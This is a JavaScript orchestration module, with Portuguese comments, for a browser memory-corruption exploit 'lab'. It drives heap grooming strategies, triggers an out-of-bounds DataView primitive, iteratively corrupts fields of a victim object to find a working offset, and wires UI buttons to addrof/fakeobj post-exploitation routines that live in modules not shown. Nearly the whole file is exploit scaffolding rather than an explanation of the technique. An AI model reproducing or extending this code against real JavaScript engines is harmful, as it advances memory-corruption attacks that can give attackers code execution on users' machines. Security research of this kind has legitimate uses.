// js/app.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs'; // Renomeia 'log' para 'appLog' para evitar conflito se necessário
import * as Int64Lib from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import { updateOOBConfigFromUI as updateGlobalOOBConfig} from './config.mjs';

// Usar appLog para todas as chamadas de log dentro deste módulo
const App = {
    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";
        appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
        updateGlobalOOBConfig();
        const spray_count_el = document.getElementById('sprayCountBase');
        const intermediate_allocs_el = document.getElementById('intermediateAllocs');

        const spray_count = spray_count_el ? parseInt(spray_count_el.value) || 500 : 500;
        const intermediate_allocs = intermediate_allocs_el ? parseInt(intermediate_allocs_el.value) || 100 : 100;

        const strategies = [
            { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
            { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
            { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
            { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
        ];
        Corruptor.resetLastSuccessfulGap();

        for (const strat of strategies) {
            if (Corruptor.getLastSuccessfulGap() !== null) {
                appLog("GAP de sucesso já encontrado. Interrompendo estratégias adicionais.", "good", FNAME_STRAT);
                break;
            }
            appLog(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);

            let victimPrepared = false;
            let currentOOBAllocationSize = Core.getOOBAllocationSize(); // Pegar o tamanho atual da config

            if (strat.oob_first) {
                await Core.triggerOOB_primitive();
                if (!Core.oob_dataview_real) { appLog("Falha OOB, pulando estratégia.", "error", FNAME_STRAT); continue; }
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
            } else {
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
                // Somente ativa OOB *depois* do grooming e vítima, se a vítima foi preparada
                if (victimPrepared) {
                    await Core.triggerOOB_primitive();
                    if (!Core.oob_dataview_real) { appLog("Falha OOB após vítima, pulando estratégia.", "error", FNAME_STRAT); continue; }
                }
            }

            if (!victimPrepared) {
                appLog(`Falha ao preparar vítima para estratégia '${strat.name}'. Pulando corrupção.`, "error", FNAME_STRAT);
                continue; // Pula para a próxima estratégia se a vítima não foi preparada
            }
            
            // Adicionando uma verificação explícita de Groomer.victim_object
            if (!Groomer.victim_object) {
                 appLog(`ERRO CRÍTICO: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Estratégia: '${strat.name}'. Pulando.`, "error", FNAME_STRAT);
                 continue;
            }
            appLog(`Vítima preparada para '${strat.name}', OOB Ativo: ${!!Core.oob_dataview_real}. Tentando corrupção...`, "info", FNAME_STRAT);
            await Corruptor.findAndCorruptVictimFields_Iterative();
            await PAUSE_LAB(2000); // Pausa entre estratégias
        }
        appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
        if (Corruptor.getLastSuccessfulGap() === null) { appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
         else {
            const addrofGapEl = document.getElementById('addrofGap');
            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
         }
    },

    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const gapStartScanEl = document.getElementById('gapStartScan');
        const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;

        if (!isNaN(gapVal)) {
            Corruptor.setCurrentTestGap(gapVal);
            appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
            // Antes de chamar try_corrupt_fields_for_gap, garantir que a vítima e OOB estão prontos
            if (!Groomer.victim_object || !Core.oob_dataview_real) {
                appLog("ERRO: Vítima ou primitiva OOB não estão prontas para teste de GAP único. Execute os Passos 0 e 1.", "error", "App.Config");
                return;
            }
            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
        } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
    },

    setupUIEventListeners: () => {
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML = '';
            const btnTestInt64 = document.createElement('button');
            btnTestInt64.textContent = 'Testar Módulo Int64';
            // Passar a função appLog (que é o log importado de utils.mjs) para testModule
            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
            moduleTestButtonsContainer.appendChild(btnTestInt64);

            const btnTestUtils = document.createElement('button');
            btnTestUtils.textContent = 'Testar Módulo Utils';
            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
            moduleTestButtonsContainer.appendChild(btnTestUtils);

            const btnTestCore = document.createElement('button');
            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
            btnTestCore.onclick = Core.testModule;
            moduleTestButtonsContainer.appendChild(btnTestCore);

            const notes = document.createElement('p');
            notes.className = 'notes';
            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais. PostExploit é conceitual.';
            moduleTestButtonsContainer.appendChild(notes);
        }

        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGap);
        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);

        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
    },

    initialize: () => {
        updateGlobalOOBConfig();
        App.setupUIEventListeners();
        appLog("Laboratório Modularizado (v2.8.2 - Correções Loop e Log) pronto para testes.", "good", "App.Init");

        const addrofGapEl = document.getElementById('addrofGap');
        if (addrofGapEl && Corruptor.getLastSuccessfulGap() !== null) {
             addrofGapEl.value = Corruptor.getLastSuccessfulGap();
        }
    }
};

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.initialize);
} else {
    App.initialize();
}

appLog("app.mjs carregado e pronto.", "info", "Global");
